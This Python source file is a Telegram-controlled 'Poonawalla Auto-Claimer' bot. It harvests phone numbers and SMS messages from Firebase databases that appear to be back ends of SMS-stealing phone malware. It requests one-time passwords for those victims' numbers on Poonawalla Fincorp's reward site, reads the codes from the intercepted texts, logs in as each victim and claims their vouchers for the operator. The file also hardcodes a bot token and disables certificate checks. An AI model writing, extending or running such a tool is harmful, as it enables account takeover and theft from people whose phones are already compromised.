#!/usr/bin/env python3
"""
Poonawalla Auto-Claimer — Super Fast + Railway-safe
- Instant Telegram push on win (no 2s live-edit lag for vouchers)
- Safe panel_name parse (no IndexError)
- Faster OTP poll + parallel panels
- Used-number skip · admin only
"""

import asyncio, json, os, re, time, threading, traceback
from collections import defaultdict
from concurrent.futures import ThreadPoolExecutor, as_completed
import requests
import urllib3
from telegram import InlineKeyboardButton, InlineKeyboardMarkup, Update
from telegram.ext import (
    Application, CallbackQueryHandler, CommandHandler,
    ContextTypes, MessageHandler, filters,
)

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# ═══════════════ CONFIG ═══════════════
BOT_TOKEN = os.environ.get("BOT_TOKEN", "9225925606:AAFg-nXjzGyYWdu-DBftcWGG2YvmB77pRAk")
ADMIN_ID = int(os.environ.get("ADMIN_ID", "8329680375"))
STORE_FILE = "poonawalla_store.json"
VOUCHER_FILE = "poonawalla_vouchers.txt"
POONAWALLA_API = "https://festive-offers.poonawallafincorp.com/api"
TARGET_BRANDS = ["swiggy", "zomato", "amazon", "nykaa", "westside", "lifestyle", "croma"]

STORE = {"panels": [], "workers": 8}
AUTO_RUNNING = False
STATS = {"processed": 0, "wins": 0, "fails": 0, "skipped": 0}
LIVE_QUEUE = []
LIVE_MSG_ID = None
LIVE_LOCK = threading.Lock()
USED_NUMBERS = set()
OTP_WAIT_TIME = 55
bot_loop = None
app = None

session = requests.Session()
session.verify = False
adapter = requests.adapters.HTTPAdapter(pool_connections=40, pool_maxsize=40, max_retries=1)
session.mount("https://", adapter)
session.mount("http://", adapter)

MAX_AGE_MINUTES = 2880
ONLINE_STATUS_FIELDS = ("status", "online", "isOnline", "connected", "active")
ONLINE_TRUE_VALUES = {"true", "1", "online", "connected", "active", "yes"}
SMS_SUBPATHS = [
    "messages", "sms", "inbox", "Sms", "SMS",
    "receivedSms", "smsList", "smsLogs", "callLogs",
]

PHONE_PATTERNS_WEIGHTED = [
    (re.compile(r"(?:phone|mobile|number|mob|no)[\s:]*(?:\+?91[\s-]?)?([6-9]\d{9})", re.I), 15),
    (re.compile(r"\b(?:\+91|91)?([6-9]\d{9})\b"), 10),
    (re.compile(r"[^0-9]([6-9]\d{9})[^0-9]"), 5),
]

# ═══════════════ STORE ═══════════════
def load_store():
    global STORE, USED_NUMBERS
    if os.path.exists(STORE_FILE):
        try:
            with open(STORE_FILE, "r") as f:
                data = json.load(f)
                STORE.update(data)
                USED_NUMBERS = set(data.get("used_numbers", []))
        except Exception:
            pass

def save_store():
    try:
        with open(STORE_FILE, "w") as f:
            data = dict(STORE)
            data["used_numbers"] = list(USED_NUMBERS)
            json.dump(data, f, indent=2)
    except Exception as e:
        print("save_store", e)

def save_voucher(txt):
    try:
        with open(VOUCHER_FILE, "a", encoding="utf-8") as f:
            f.write(txt + "\n" + "=" * 40 + "\n")
    except Exception:
        pass

def add_to_queue(msg):
    print(msg, flush=True)
    with LIVE_LOCK:
        LIVE_QUEUE.append(msg)
        if len(LIVE_QUEUE) > 20:
            LIVE_QUEUE.pop(0)

def panel_short(url):
    """Safe name — never IndexError."""
    try:
        u = (url or "").strip()
        if "://" in u:
            host = u.split("://", 1)[1]
        else:
            host = u
        host = host.split("/")[0]
        name = host.split(".")[0]
        return (name or "panel")[:22]
    except Exception:
        return "panel"

def normalize_panel_url(url):
    url = (url or "").strip().rstrip("/")
    if not url.startswith("http"):
        url = "https://" + url
    if not url.endswith("/"):
        url += "/"
    return url

# ═══════════════ FIREBASE ═══════════════
def _is_online(dev):
    for field in ONLINE_STATUS_FIELDS:
        raw = dev.get(field)
        if raw is None:
            continue
        if isinstance(raw, bool):
            return raw
        if isinstance(raw, int):
            return raw == 1
        if str(raw).lower().strip() in ONLINE_TRUE_VALUES:
            return True
    return False

def _clean_phone(raw):
    if not raw:
        return None
    digits = re.sub(r"\D", "", str(raw))
    if digits.startswith("91") and len(digits) == 12:
        digits = digits[2:]
    if digits.startswith("0") and len(digits) == 11:
        digits = digits[1:]
    if len(digits) == 10 and digits[0] in "6789":
        return digits
    return None

def _phone_from_device_fields(dev):
    sims = dev.get("sims", [])
    if isinstance(sims, dict):
        sims = list(sims.values())
    if isinstance(sims, list):
        for sim in sims[:2]:
            if isinstance(sim, dict):
                for k in ("phoneNumber", "phone", "number", "mobNo", "mob"):
                    p = _clean_phone(sim.get(k))
                    if p:
                        return p
    for k in ("mobNo", "mob", "phoneNumber", "phone", "number", "mobile"):
        p = _clean_phone(dev.get(k))
        if p:
            return p
    return None

def _phone_from_messages(msgs):
    counts = {}
    items = msgs.values() if isinstance(msgs, dict) else (msgs if isinstance(msgs, list) else [])
    for msg in items:
        if not isinstance(msg, dict):
            continue
        text = str(
            msg.get("body") or msg.get("message") or msg.get("text")
            or msg.get("content") or ""
        )
        # also receiverNumber field
        for k in ("receiverNumber", "receiver", "to", "phone"):
            p = _clean_phone(msg.get(k))
            if p:
                counts[p] = counts.get(p, 0) + 20
        for pat, score in PHONE_PATTERNS_WEIGHTED:
            for num in pat.findall(text):
                digits = re.sub(r"\D", "", num)
                if digits.startswith("91") and len(digits) == 12:
                    digits = digits[2:]
                if len(digits) == 10 and digits[0] in "6789":
                    counts[digits] = counts.get(digits, 0) + score
    return max(counts, key=counts.get) if counts else None

def _fetch_phone_from_firebase(fb_session, firebase_url, cid):
    for sub in ("messages", "sms", "smsLogs", "inbox"):
        try:
            r = fb_session.get(f"{firebase_url}{sub}/{cid}.json", timeout=6)
            if r.status_code == 200:
                data = r.json()
                if isinstance(data, dict) and data:
                    p = _phone_from_messages(data)
                    if p:
                        return p
        except Exception:
            pass
    return None

def _load_firebase_root(firebase_url):
    ROOT_KEYS = [
        "clients", "devices", "users", "Clients", "Devices",
        "client", "device", "phones", "mobiles", "checkOnline",
    ]
    fb_sess = requests.Session()
    fb_sess.verify = False
    for key in ROOT_KEYS:
        try:
            r = fb_sess.get(f"{firebase_url}{key}.json", timeout=10)
            if r.status_code != 200:
                continue
            data = r.json()
            if isinstance(data, dict) and len(data) > 0:
                # checkOnline may be status objects
                return key, data
        except Exception:
            continue
    return None, None

def _device_recency(firebase_url, cid, fb_session):
    for sub in ("messages", "sms", "smsLogs"):
        try:
            r = fb_session.get(
                f'{firebase_url}{sub}/{cid}.json?orderBy="$key"&limitToLast=1',
                timeout=5,
            )
            if r.status_code != 200:
                continue
            d = r.json()
            if not isinstance(d, dict) or not d:
                continue
            # try numeric keys or timestamp inside
            for k, v in d.items():
                if str(k).lstrip("-").isdigit():
                    last_ms = int(k) if int(k) > 1e12 else int(k) * 1000
                    age_min = (time.time() * 1000 - last_ms) / 60000
                    if age_min >= 0:
                        return age_min
                if isinstance(v, dict):
                    ts = v.get("timestamp") or v.get("time") or v.get("date")
                    if ts:
                        try:
                            t = float(ts)
                            if t < 1e12:
                                t *= 1000
                            return (time.time() * 1000 - t) / 60000
                        except Exception:
                            pass
            return 0  # has messages, age unknown → treat live
        except Exception:
            continue
    return None

def extract_devices(firebase_url, log_func):
    firebase_url = normalize_panel_url(firebase_url)
    root_key, raw_data = _load_firebase_root(firebase_url)
    if not raw_data:
        log_func(f"⚪ {panel_short(firebase_url)}: no clients/devices")
        return []
    panel_name = panel_short(firebase_url)

    all_devs = {}
    for cid, d in raw_data.items():
        if isinstance(d, dict):
            all_devs[cid] = d
        elif d is True or str(d).lower() in ONLINE_TRUE_VALUES:
            # checkOnline style: key only
            all_devs[cid] = {"status": True}

    online = {cid: d for cid, d in all_devs.items() if _is_online(d)}
    log_func(f"🔥 {panel_name}: {len(online)}/{len(all_devs)} online")
    if not online:
        return []

    fb_session = requests.Session()
    fb_session.verify = False

    msg_cids = set()
    for sub in ("messages", "sms", "smsLogs"):
        try:
            r = fb_session.get(f"{firebase_url}{sub}.json?shallow=true", timeout=8)
            if r.status_code == 200 and isinstance(r.json(), dict):
                msg_cids |= set(r.json().keys())
        except Exception:
            pass

    candidates = {cid: dev for cid, dev in online.items() if cid in msg_cids} or online
    log_func(f"📨 {panel_name}: {len(candidates)} online+with messages")
    if not candidates:
        return []

    live = {}
    skipped = 0
    lock = threading.Lock()

    def check(cid, dev):
        nonlocal skipped
        age_min = _device_recency(firebase_url, cid, fb_session)
        with lock:
            if age_min is None:
                # no messages age → still try if online
                live[cid] = (dev, 9999)
            elif age_min <= MAX_AGE_MINUTES:
                live[cid] = (dev, age_min)
            else:
                skipped += 1

    with ThreadPoolExecutor(max_workers=40) as ex:
        futs = [ex.submit(check, cid, dev) for cid, dev in candidates.items()]
        for f in as_completed(futs):
            try:
                f.result()
            except Exception:
                pass

    log_func(f"📊 {panel_name}: {len(live)} live (<48h), {skipped} skipped")
    if not live:
        return []

    result, seen = [], set()
    lock2 = threading.Lock()

    def proc(item):
        cid, (dev, age_min) = item
        phone = _phone_from_device_fields(dev) or _fetch_phone_from_firebase(
            fb_session, firebase_url, cid
        )
        if not phone:
            return
        with lock2:
            if phone in seen:
                return
            seen.add(phone)
            result.append({"client_id": cid, "phone": phone, "age_min": age_min})

    with ThreadPoolExecutor(max_workers=40) as ex:
        futs = [ex.submit(proc, item) for item in live.items()]
        for f in as_completed(futs):
            try:
                f.result()
            except Exception:
                pass

    result.sort(key=lambda x: x["age_min"] if x["age_min"] is not None else 9999)
    log_func(f"✅ {panel_name}: {len(result)} phones ready")
    return result

# ═══════════════ OTP ═══════════════
def _extract_otp_from_body(body):
    body_lower = body.lower()
    candidates = re.findall(r"\b(\d{4,6})\b", body)
    if not candidates:
        return None
    scores = defaultdict(int)
    for c in candidates:
        n = int(c)
        if 1900 <= n <= 2099:
            continue
        scores[c] += 1
        for kw in ("otp", "code", "verify", "verification", "pin", "one time", "passcode"):
            if kw in body_lower:
                scores[c] += 5
                break
        if len(c) == 6:
            scores[c] += 3
        if re.search(rf"[₹Rs\.]\s*{re.escape(c)}", body):
            scores[c] -= 10
    if not scores:
        return None
    return max(scores, key=scores.__getitem__)

def get_latest_key(panel, cid):
    panel = normalize_panel_url(panel)
    for sub in SMS_SUBPATHS:
        try:
            r = session.get(
                f'{panel}{sub}/{cid}.json?orderBy="$key"&limitToLast=1',
                timeout=4,
            )
            if r.status_code == 200:
                d = r.json()
                if isinstance(d, dict) and d:
                    return list(d.keys())[0]
        except Exception:
            pass
    return None

def wait_for_otp(panel, cid, last_key, log_func):
    panel = normalize_panel_url(panel)
    deadline = time.time() + OTP_WAIT_TIME
    _nk = lambda k: int(k) if str(k).lstrip("-").isdigit() else 0
    last_n = _nk(last_key) if last_key else 0

    while time.time() < deadline:
        if not AUTO_RUNNING:
            return None
        for sub in SMS_SUBPATHS:
            try:
                r = session.get(
                    f'{panel}{sub}/{cid}.json?orderBy="$key"&limitToLast=15',
                    timeout=4,
                )
                if r.status_code != 200:
                    continue
                msgs = r.json()
                if not isinstance(msgs, dict):
                    continue
                for k in sorted(msgs.keys(), key=_nk, reverse=True):
                    if last_key and _nk(k) <= last_n:
                        break
                    body = str(
                        msgs[k].get("message")
                        or msgs[k].get("body")
                        or msgs[k].get("text")
                        or ""
                    )
                    sender = str(
                        msgs[k].get("sender")
                        or msgs[k].get("address")
                        or msgs[k].get("senderNumber")
                        or ""
                    )
                    if (
                        "PFINCO" in sender.upper()
                        or "POONAWALLA" in body.upper()
                        or "poonawalla" in body.lower()
                        or "otp" in body.lower()
                    ):
                        otp = _extract_otp_from_body(body)
                        if otp:
                            log_func(f"📩 OTP {otp}")
                            return otp
            except Exception:
                pass
        time.sleep(0.7)
    return None

# ═══════════════ POONAWALLA ═══════════════
def tg_send_now(text, html=True):
    """Instant Telegram — no wait for live editor."""
    def _send():
        try:
            if bot_loop and app:
                asyncio.run_coroutine_threadsafe(
                    app.bot.send_message(
                        chat_id=ADMIN_ID,
                        text=text,
                        parse_mode="HTML" if html else None,
                        disable_web_page_preview=True,
                    ),
                    bot_loop,
                )
            else:
                requests.post(
                    f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage",
                    json={
                        "chat_id": ADMIN_ID,
                        "text": text[:4000],
                        "parse_mode": "HTML" if html else None,
                        "disable_web_page_preview": True,
                    },
                    timeout=10,
                )
        except Exception as e:
            print("tg_send", e)

    threading.Thread(target=_send, daemon=True).start()

def process_poonawalla(device, log_func):
    phone = device["phone"]
    cid = device["client_id"]
    panel = normalize_panel_url(device["panel"])

    log_func(f"👤 +91{phone}")
    headers = {
        "User-Agent": "Mozilla/5.0 (Linux; Android 12; Redmi Note 9 Pro Max) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36",
        "content-type": "application/json",
        "origin": "https://festive-offers.poonawallafincorp.com",
        "referer": "https://festive-offers.poonawallafincorp.com/play-and-win",
    }

    last_key = get_latest_key(panel, cid)
    try:
        r = session.post(
            f"{POONAWALLA_API}/otp/send",
            headers=headers,
            json={
                "mobile": phone,
                "consentTerms": True,
                "consentCommunication": True,
            },
            timeout=10,
        )
        res_data = r.json()
        if not res_data.get("success"):
            log_func(f"❌ {phone}: {res_data.get('message', 'send fail')}")
            STATS["fails"] += 1
            USED_NUMBERS.add(phone)
            save_store()
            return
    except Exception as e:
        log_func(f"❌ {phone}: send {e}")
        STATS["fails"] += 1
        USED_NUMBERS.add(phone)
        save_store()
        return

    log_func(f"⏳ {phone}: OTP wait…")
    otp = wait_for_otp(panel, cid, last_key, log_func)
    if not otp:
        log_func(f"⏳ {phone}: timeout")
        STATS["fails"] += 1
        USED_NUMBERS.add(phone)
        save_store()
        return

    log_func(f"🔑 {phone}: {otp} verify…")
    try:
        r = session.post(
            f"{POONAWALLA_API}/otp/verify",
            headers=headers,
            json={"mobile": phone, "otp": otp, "referrer": "/play-and-win"},
            timeout=10,
        )
        res = r.json()
        if not res.get("success"):
            log_func(f"❌ {phone}: verify fail")
            STATS["fails"] += 1
            USED_NUMBERS.add(phone)
            save_store()
            return
        token = res["data"]["token"]
        headers["authorization"] = f"Bearer {token}"
    except Exception:
        STATS["fails"] += 1
        USED_NUMBERS.add(phone)
        save_store()
        return

    try:
        r = session.get(f"{POONAWALLA_API}/offer/status", headers=headers, timeout=10)
        status_data = r.json()
        game_data = status_data.get("data", {}).get("game", {})
        if game_data.get("played"):
            offer = game_data.get("offer")
            if offer:
                send_voucher(phone, offer, is_existing=True, log_func=log_func)
                STATS["wins"] += 1
                USED_NUMBERS.add(phone)
                save_store()
                return
    except Exception:
        pass

    games = ["SCRATCH_CARD", "SPIN_WIN", "SHUFFLE_CARD"]
    won = False
    for game in games:
        try:
            r = session.post(
                f"{POONAWALLA_API}/game/play",
                headers=headers,
                json={"gameType": game},
                timeout=10,
            )
            if r.status_code == 200:
                res = r.json()
                if "wonOffer" in res.get("data", {}):
                    offer = res["data"]["wonOffer"]
                    send_voucher(phone, offer, is_existing=False, log_func=log_func)
                    won = True
                    STATS["wins"] += 1
                    break
        except Exception:
            pass

    if not won:
        log_func(f"😔 {phone}: no win")
        STATS["fails"] += 1

    USED_NUMBERS.add(phone)
    save_store()
    STATS["processed"] += 1

def send_voucher(phone, offer, is_existing=False, log_func=None):
    brand = offer.get("brand", "Unknown")
    code = offer.get("rewardCode") or offer.get("code")
    desc = re.sub(r"<[^>]+>", "", str(offer.get("shortDesc", ""))).strip()
    details = re.sub(r"<[^>]+>", "", str(offer.get("details", ""))).strip()
    url = offer.get("redemptionUrl", "N/A")

    brand_lower = brand.lower()
    desc_lower = desc.lower()
    details_lower = details.lower()
    is_target_brand = any(tb in brand_lower for tb in TARGET_BRANDS)
    is_100_off = "100%" in desc_lower or "100 %" in desc_lower or "100% off" in details_lower
    is_target = is_target_brand or is_100_off

    if is_target:
        print("\n\033[92m" + "╔" + "═" * 62 + "╗")
        print("║  🚨 TARGET BRAND VOUCHER 🚨")
        print(f"║ 📱 {phone}  🏷️ {brand}  🔑 {code}")
        print("╚" + "═" * 62 + "╝\033[0m\n", flush=True)
        title = "🔥🔥 <b>TARGET VOUCHER</b> 🔥🔥"
        if is_existing:
            title = "🔄 <b>TARGET ALREADY CLAIMED</b>"
        if log_func:
            log_func(f"🔥 {phone} TARGET: {brand} ({code})")
    else:
        title = "🎉 NORMAL WIN"
        if is_existing:
            title = "🔄 NORMAL ALREADY CLAIMED"
        if log_func:
            log_func(f"✅ {phone} WIN: {brand} ({code})")

    msg = (
        f"{title}\n"
        f"📱 <code>{phone}</code>\n"
        f"🏷️ <b>{brand}</b>\n"
        f"🎁 {desc}\n"
        f"📝 {details}\n"
        f"🔑 <code>{code}</code>\n"
        f"🔗 {url}"
    )
    save_voucher(msg)
    # INSTANT bot push
    tg_send_now(msg)

# ═══════════════ WORKER ═══════════════
def run_worker():
    global AUTO_RUNNING
    try:
        add_to_queue("🔍 Scanning panels…")
        all_devices = []
        panels = list(STORE.get("panels") or [])
        total = len(panels)

        # parallel panel scan (faster)
        def scan_one(i_panel):
            i, panel = i_panel
            if not AUTO_RUNNING:
                return []
            name = panel_short(panel)
            add_to_queue(f"[{i}/{total}] {name}")
            try:
                devs = extract_devices(panel, add_to_queue)
            except Exception as e:
                add_to_queue(f"❌ {name}: {e}")
                return []
            for d in devs:
                d["panel"] = normalize_panel_url(panel)
            return devs

        with ThreadPoolExecutor(max_workers=min(8, max(1, total))) as ex:
            futs = [ex.submit(scan_one, (i, p)) for i, p in enumerate(panels, 1)]
            for f in as_completed(futs):
                if not AUTO_RUNNING:
                    break
                try:
                    all_devices.extend(f.result() or [])
                except Exception as e:
                    add_to_queue(f"scan err {e}")

        if not all_devices:
            add_to_queue("❌ No online devices.")
            AUTO_RUNNING = False
            return

        # dedupe by phone, skip used
        seen = set()
        todo = []
        skipped_used = 0
        for d in all_devices:
            ph = d.get("phone")
            if not ph or ph in seen:
                continue
            seen.add(ph)
            if ph in USED_NUMBERS:
                skipped_used += 1
                continue
            todo.append(d)

        add_to_queue(
            f"🚀 {len(todo)} fresh · skip used {skipped_used} · workers {STORE['workers']}"
        )

        with ThreadPoolExecutor(max_workers=STORE["workers"]) as ex:
            futs = [ex.submit(process_poonawalla, dev, add_to_queue) for dev in todo]
            for f in as_completed(futs):
                if not AUTO_RUNNING:
                    break
                try:
                    f.result()
                except Exception as e:
                    add_to_queue(f"worker {e}")

        add_to_queue("🏁 Scan complete")
    except Exception as e:
        add_to_queue(f"💥 run_worker: {e}")
        traceback.print_exc()
    finally:
        AUTO_RUNNING = False

# ═══════════════ TELEGRAM UI ═══════════════
def is_admin(uid):
    return int(uid) == ADMIN_ID

def get_main_kb():
    status = "🟢 RUNNING" if AUTO_RUNNING else "🔴 STOPPED"
    return InlineKeyboardMarkup(
        [
            [InlineKeyboardButton(f"📊 Status: {status}", callback_data="noop")],
            [
                InlineKeyboardButton("▶️ Start Scan", callback_data="start"),
                InlineKeyboardButton("⏹ Stop", callback_data="stop"),
            ],
            [
                InlineKeyboardButton(f"👷 Workers: {STORE['workers']}", callback_data="noop"),
                InlineKeyboardButton("⚙️ Set Workers", callback_data="set_workers"),
            ],
            [
                InlineKeyboardButton("➕ Add Panel", callback_data="add_panel"),
                InlineKeyboardButton("📋 View Panels", callback_data="view_panels"),
            ],
            [
                InlineKeyboardButton("🎟️ Vouchers", callback_data="view_vouchers"),
                InlineKeyboardButton("🗑 Clear Used", callback_data="clear_used"),
            ],
            [
                InlineKeyboardButton("🧹 Clear ALL Panels", callback_data="clear_panels"),
            ],
        ]
    )

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not is_admin(update.effective_user.id):
        return await update.message.reply_text("⛔ Unauthorized")
    await update.message.reply_text(
        "🤖 <b>Poonawalla Auto-Claimer</b>\nSuper-fast · Railway ready",
        reply_markup=get_main_kb(),
        parse_mode="HTML",
    )

async def live_status_updater():
    global LIVE_MSG_ID
    while AUTO_RUNNING:
        with LIVE_LOCK:
            logs = list(LIVE_QUEUE)
        quote = "\n".join(logs[-12:]) if logs else "…"
        txt = (
            f"⚙️ <b>Live</b>\n<blockquote>{quote}</blockquote>\n"
            f"✅ {STATS['wins']} · ❌ {STATS['fails']} · ⏳ {STATS['processed']}"
        )
        try:
            if LIVE_MSG_ID:
                await app.bot.edit_message_text(
                    chat_id=ADMIN_ID, message_id=LIVE_MSG_ID, text=txt, parse_mode="HTML"
                )
            else:
                m = await app.bot.send_message(
                    chat_id=ADMIN_ID, text=txt, parse_mode="HTML"
                )
                LIVE_MSG_ID = m.message_id
        except Exception:
            pass
        await asyncio.sleep(2)

async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    global AUTO_RUNNING, LIVE_MSG_ID
    query = update.callback_query
    await query.answer()
    data = query.data
    if not is_admin(query.from_user.id):
        return

    if data == "start":
        if AUTO_RUNNING:
            return await query.edit_message_text("⚠️ Already running", reply_markup=get_main_kb())
        if not STORE["panels"]:
            return await query.edit_message_text("❌ Add panel first", reply_markup=get_main_kb())
        AUTO_RUNNING = True
        LIVE_MSG_ID = None
        STATS.update({"processed": 0, "wins": 0, "fails": 0, "skipped": 0})
        LIVE_QUEUE.clear()
        await query.edit_message_text("🚀 Started", reply_markup=get_main_kb())
        threading.Thread(target=run_worker, daemon=True).start()
        asyncio.create_task(live_status_updater())

    elif data == "stop":
        AUTO_RUNNING = False
        await query.edit_message_text("⏹ Stopping…", reply_markup=get_main_kb())

    elif data == "menu":
        await query.edit_message_text(
            "🤖 <b>Poonawalla</b>", reply_markup=get_main_kb(), parse_mode="HTML"
        )

    elif data == "set_workers":
        await query.edit_message_text("Workers 1–20 bhejo:")
        context.user_data["step"] = "set_workers"

    elif data == "add_panel":
        await query.edit_message_text("Firebase URL(s) — ek line pe ek:")
        context.user_data["step"] = "add_panel"

    elif data == "view_panels":
        txt = "📋 <b>Panels:</b>\n\n"
        for p in STORE["panels"]:
            txt += f"• {p}\n"
        if not STORE["panels"]:
            txt += "(empty)"
        await query.edit_message_text(txt[:4000], reply_markup=get_main_kb(), parse_mode="HTML")

    elif data == "view_vouchers":
        if not os.path.exists(VOUCHER_FILE):
            return await query.edit_message_text("No vouchers", reply_markup=get_main_kb())
        try:
            with open(VOUCHER_FILE, "r", encoding="utf-8") as f:
                content = f.read()[-3500:]
            await query.message.reply_text(
                f"🎟️ <pre>{content}</pre>", parse_mode="HTML"
            )
        except Exception:
            await query.message.reply_text("read error")

    elif data == "clear_used":
        USED_NUMBERS.clear()
        save_store()
        await query.edit_message_text("🗑 Used cleared", reply_markup=get_main_kb())

    elif data == "clear_panels":
        n = len(STORE.get("panels") or [])
        STORE["panels"] = []
        save_store()
        await query.edit_message_text(f"🧹 Cleared {n} panels", reply_markup=get_main_kb())

def extract_firebase_urls(text):
    if not text:
        return []
    found = re.findall(r'https?://[^\s<>"\']+', text)
    out = []
    for u in found:
        u = u.rstrip(').,;]"\'')
        if 'firebaseio.com' in u or 'firebasedatabase.app' in u:
            out.append(u)
    for m in re.findall(
        r'(?:^|[\s])([a-zA-Z0-9_-]+\.(?:firebaseio\.com|firebasedatabase\.app))',
        text,
    ):
        out.append('https://' + m)
    seen, res = set(), []
    for u in out:
        cu = normalize_panel_url(u)
        if cu not in seen:
            seen.add(cu)
            res.append(cu)
    return res

async def text_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not is_admin(update.effective_user.id):
        return
    step = context.user_data.get("step")
    txt = (update.message.text or "").strip()

    # bulk paste without button — auto add
    if not step and ("firebaseio.com" in txt or "firebasedatabase.app" in txt):
        urls = extract_firebase_urls(txt)
        added = dups = 0
        for url in urls:
            if url not in STORE["panels"]:
                STORE["panels"].append(url)
                added += 1
            else:
                dups += 1
        if added or dups:
            save_store()
            await update.message.reply_text(
                f"📥 Bulk panels\n✅ Added: {added}\n⚠️ Dup: {dups}\nTotal: {len(STORE['panels'])}\n\n▶️ Start Scan dabao",
                reply_markup=get_main_kb(),
            )
        return

    if step == "set_workers":
        if txt.isdigit() and 1 <= int(txt) <= 20:
            STORE["workers"] = int(txt)
            save_store()
            await update.message.reply_text(
                f"✅ Workers {txt}", reply_markup=get_main_kb()
            )
        else:
            await update.message.reply_text("1–20 only")
        context.user_data["step"] = None

    elif step == "add_panel":
        urls = extract_firebase_urls(txt)
        added = 0
        dups = 0
        for url in urls:
            url = normalize_panel_url(url)
            if url not in STORE["panels"]:
                STORE["panels"].append(url)
                added += 1
            else:
                dups += 1
        if added or dups:
            save_store()
            await update.message.reply_text(
                f"✅ Added: {added}\n⚠️ Dup: {dups}\nTotal: {len(STORE['panels'])}",
                reply_markup=get_main_kb(),
            )
        else:
            await update.message.reply_text("❌ No valid Firebase URL found")
        context.user_data["step"] = None

async def on_error(update, context):
    print("ERR", context.error)

async def post_init(application: Application):
    global bot_loop
    bot_loop = asyncio.get_running_loop()

def main():
    load_store()
    global app
    # Railway: PORT not needed for polling bot
    app = (
        Application.builder()
        .token(BOT_TOKEN)
        .post_init(post_init)
        .concurrent_updates(True)
        .build()
    )
    app.add_handler(CommandHandler("start", start))
    app.add_handler(CallbackQueryHandler(button_handler))
    app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, text_handler))
    app.add_error_handler(on_error)
    print("🤖 Poonawalla bot online", flush=True)
    app.run_polling(drop_pending_updates=True)

if __name__ == "__main__":
    main()
